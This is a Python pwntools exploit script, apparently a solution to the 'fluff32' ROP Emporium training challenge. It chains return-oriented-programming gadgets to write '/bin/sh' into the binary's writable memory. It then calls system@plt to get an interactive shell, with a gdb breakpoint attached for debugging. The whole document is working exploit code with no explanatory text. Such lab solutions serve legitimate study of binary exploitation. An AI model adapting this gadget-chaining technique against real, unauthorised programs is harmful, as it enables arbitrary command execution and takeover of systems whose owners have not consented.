from pwn import *

def writeECX(addr):
    # 0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
    payload = ""
    payload += p32(0x8048671)
    payload += p32(0xffffffff)
    # 0x080483e1 : pop ebx ; ret
    payload += p32(0x80483e1)
    payload += p32(addr)
    # 0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
    payload += p32(0x804867b)
    payload += p32(0xffffffff)
    # 0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
    payload += p32(0x8048689)
    payload += p32(0xffffffff)
    return payload

def writeEDX(addr):
    # 0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
    payload = ""
    payload += p32(0x8048671)
    payload += p32(0xffffffff)
    # 0x080483e1 : pop ebx ; ret
    payload += p32(0x80483e1)
    payload += p32(addr)
    # 0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
    payload += p32(0x804867b)
    payload += p32(0xffffffff)
    return payload

def writeBytes(addr, value):
    ecx = writeECX(addr)
    edx = writeEDX(value)
    payload = ""
    payload += ecx
    payload += edx
    # 0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
    payload += p32(0x8048693)
    payload += p32(0xffffffff)
    payload += p32(0x00000000)
    return payload

r = process('./fluff32')

gdb_cmd = [
        'b *0x804864b',
        'c'
        ]

gdb.attach(r, gdbscript = "\n".join(gdb_cmd))

r.recvuntil('> ')
payload = ""
payload += "A"*44
payload += writeBytes(0x804a028, 0x6e69622f)
payload += writeBytes(0x804a02c, 0x0068732f)
payload += p32(0x8048430)       # system@plt
payload += "BBBB"
payload += p32(0x804a028)
r.sendline(payload)
r.interactive()
